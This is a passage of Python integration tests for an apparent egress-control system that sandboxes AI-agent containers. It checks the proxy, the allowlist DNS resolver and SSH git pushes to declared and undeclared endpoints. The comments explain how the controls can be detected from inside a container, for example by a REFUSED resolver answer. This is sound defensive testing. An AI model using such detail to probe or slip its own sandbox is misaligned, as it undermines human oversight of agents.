            [RUNTIME, "inspect", "agent-container-accb9", "--format", fmt],
            capture_output=True, text=True,
        ).stdout.strip()  # fmt: skip

    # The two halves of "no rules": the agent is in its OWN namespace (so there is
    # nowhere for a NET_ADMIN sidecar's rules to reach it from), and it still owns
    # its published port — the T118 migration must not run for an environment that
    # never declared anything.
    netmode = inspect("{{.HostConfig.NetworkMode}}")
    assert not netmode.startswith("container:"), (
        f"the agent joined another container's namespace ({netmode!r}) with no declaration"
    )
    assert "2222" in inspect("{{.HostConfig.PortBindings}}"), (
        "the published port moved off the agent, so the port-owner migration ran "
        "for an environment that never opted in"
    )

    # `; true` so the exit code reports nothing: `printenv` fails on the first
    # unset name, and here EVERY name being unset is the passing case.
    proxy = _exec("accb9", ["sh", "-c", "printenv HTTPS_PROXY https_proxy NO_PROXY no_proxy; true"])
    assert not proxy.stdout.strip(), f"proxy variables were injected anyway: {proxy.stdout!r}"

    # No forced resolver, checked twice. An undeclared name resolving rules out an
    # allowlist, and the rcode rules out ours being in the path at all: REFUSED is
    # a POLICY rcode that only unbound produces here — an ordinary resolver answers
    # NOERROR or NXDOMAIN, never that (research R16/R19a).
    assert _exec("accb9", ["getent", "hosts", "api.openai.com"]).returncode == 0, (
        "an undeclared name did not resolve — an allowlist resolver was applied "
        "to an environment that declared nothing"
    )
    probe = _dns_probe("accb9", "t139-undeclared.example.com")
    assert not probe.startswith("RCODE 5"), (
        f"the resolver answered REFUSED ({probe!r}) — REFUSED is a POLICY answer, "
        f"so the allowlist resolver is in the path of an undeclared environment"
    )

    # And unrestricted, not merely un-proxied: a host no declaration anywhere in
    # this feature permits is reachable.
    reach = _exec("accb9", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                            "https://api.openai.com/v1/models"])  # fmt: skip
    assert reach.returncode == 0, (
        f"egress was restricted without a declaration (curl exit {reach.returncode})"
    )


# --- T138 / quickstart S18: a REAL git push over a declared SSH endpoint ------

_GIT_SERVER_DOCKERFILE = """FROM alpine:3.21
RUN apk add --no-cache openssh-server git \
 && ssh-keygen -A \
 && adduser -D -s /bin/sh git \\
 && passwd -u git 2>/dev/null || true
COPY authorized_keys /home/git/.ssh/authorized_keys
RUN chown -R git:git /home/git/.ssh && chmod 700 /home/git/.ssh \
 && chmod 600 /home/git/.ssh/authorized_keys \
 && mkdir -p /srv/repo.git && git init --bare -b main /srv/repo.git \
 && chown -R git:git /srv/repo.git
EXPOSE 22
CMD ["/usr/sbin/sshd","-D","-e"]
"""
# `passwd -u` is load-bearing, not tidying: `adduser -D` leaves the account LOCKED,
# and sshd refuses PUBLIC-KEY auth for a locked account. Without it the push fails
# with `Permission denied (publickey)` — which reads exactly like a boundary refusal
# while the boundary is in fact working, since the connection reached the server to
# be refused at all.

_PUSH_SCRIPT = """
export GIT_SSH_COMMAND="ssh -i ~/.ssh/id_push -o IdentitiesOnly=yes -o IdentityAgent=none \
 -o StrictHostKeyChecking=no -o ConnectTimeout=10"
D=$(mktemp -d); cd "$D"
git init -q -b main .
git config user.email t@example.com; git config user.name T
date > file.txt
git add file.txt; git commit -qm "{msg}"
git remote add origin ssh://git@{host}:22/srv/repo.git
git push origin main 2>&1 | tail -6; echo "exit=${{PIPESTATUS[0]}}"
"""


def test_git_push_over_a_declared_ssh_endpoint_actually_pushes(acc):
    """T138, quickstart S18 — the assertion the feature calls unshippable if it fails.

    HERMETIC ON PURPOSE. The obvious version pushes to github.com, which needs a
    write credential and touches real infrastructure; it also cannot express the
    NEGATIVE case, because there is no second GitHub to leave undeclared. So the
    destination is a throwaway SSH git server on the compose network: the declared
    one must accept a real push, and an identical UNDECLARED one must not. Without
    that control the test proves only that something worked — a boundary permitting
    everything passes the positive arm.

    The transport arm (`ssh -T`) was already covered and is not what this adds. What
    was never exercised is a COMPLETE push — several round trips and a pack upload —
    over a connection the packet filter had to permit.
    """
    laptop = _gen_keypair(acc.tmp / "lapS18")
    push = _gen_keypair(acc.tmp / "pushkey")
    names = ("acc-s18-declared", "acc-s18-undeclared")

    def drop_servers():
        """Stop THEN remove, on every exit path.

        The first version removed without stopping and only cleaned up after the
        final assertion, so one failure left both servers running and every later
        run died at `docker run` with a name clash — a broken test reporting the
        wrong reason from the second attempt onward.
        """
        for n in names:
            subprocess.run([RUNTIME, "stop", n], capture_output=True)
            subprocess.run([RUNTIME, "rm", "-v", n], capture_output=True)

    srv_ctx = acc.tmp / "gitsrv"
    srv_ctx.mkdir(parents=True, exist_ok=True)
    (srv_ctx / "Dockerfile").write_text(_GIT_SERVER_DOCKERFILE)
    (srv_ctx / "authorized_keys").write_text(push.with_suffix(".pub").read_text())
    assert (
        subprocess.run(
            [RUNTIME, "build", "-q", "-t", "acc-gitsrv:test", str(srv_ctx)],
            capture_output=True,
            text=True,
        ).returncode
        == 0
    ), "could not build the throwaway git server"

    drop_servers()
    try:
        for n in names:
            assert (
                subprocess.run(
                    [RUNTIME, "run", "-d", "--name", n, "acc-gitsrv:test"], capture_output=True
                ).returncode
                == 0
            )
        time.sleep(4)

        proj = _phase_b_project(acc, "accs18")
        acc.register("accs18")
        # The first deploy CREATES the compose network. Only then can the servers
        # join it and have an address, and the declaration names an address — so it
        # cannot be written before the network exists.
        assert (
            acc.cli(
                ["up", "accs18", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
            ).returncode
            == 0
        )
        net = subprocess.run(
            [
                RUNTIME,
                "inspect",
                "agent-egress-accs18",
                "--format",
                "{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}",
            ],
            capture_output=True,
            text=True,
        ).stdout.strip()
        ips = {}
        for n in names:
            subprocess.run([RUNTIME, "network", "connect", net, n], capture_output=True)
            ips[n] = subprocess.run(
                [
                    RUNTIME,
                    "inspect",
                    n,
                    "--format",
                    # Concatenated, not %-formatted or f-string: the Go template is
                    # all braces, so both alternatives would fight the syntax.
                    '{{(index .NetworkSettings.Networks "' + net + '").IPAddress}}',
                ],
                capture_output=True,
                text=True,
            ).stdout.strip()
            assert ips[n], f"no address for {n} on {net}"

        spec = proj / ".agent-container" / "environments.yaml"
        spec.write_text(
            spec.read_text().replace(
                "      allow:\n        - provider: anthropic\n",
                f"      allow:\n        - provider: anthropic\n"
                f"        - {{host: {ips[names[0]]}, port: 22}}\n",
            )
        )
        assert acc.cli(["redeploy", "accs18"], cwd=proj).returncode == 0

        agent = "agent-container-accs18"
        subprocess.run([RUNTIME, "exec", agent, "sh", "-c", "mkdir -p ~/.ssh; chmod 700 ~/.ssh"])
        subprocess.run([RUNTIME, "cp", str(push), f"{agent}:/home/dev/.ssh/id_push"])
        subprocess.run(
            [RUNTIME, "exec", "-u", "root", agent, "chown", "dev:dev", "/home/dev/.ssh/id_push"]
        )
        subprocess.run([RUNTIME, "exec", agent, "chmod", "600", "/home/dev/.ssh/id_push"])

        declared = _exec(
            "accs18",
            ["bash", "-lc", _PUSH_SCRIPT.format(host=ips[names[0]], msg="s18 declared")],
        )
        assert "exit=0" in declared.stdout, (
            "a real push to a DECLARED ssh endpoint failed — S18 says the feature is "
            f"unshippable if this fails:\n{declared.stdout}\n{declared.stderr}"
        )
        received = subprocess.run(
            [RUNTIME, "exec", names[0], "git", "--git-dir=/srv/repo.git", "log", "--oneline", "-1"],
            capture_output=True,
            text=True,
        ).stdout
        assert "s18 declared" in received, (
            f"the push reported success but the server has nothing: {received!r}"
        )

        undeclared = _exec(
            "accs18",
            ["bash", "-lc", _PUSH_SCRIPT.format(host=ips[names[1]], msg="s18 undeclared")],
        )
        assert "exit=0" not in undeclared.stdout, (
            "an UNDECLARED ssh endpoint accepted a push — without this arm the "
            f"assertion above proves only that something worked:\n{undeclared.stdout}"
        )
    finally:
        drop_servers()
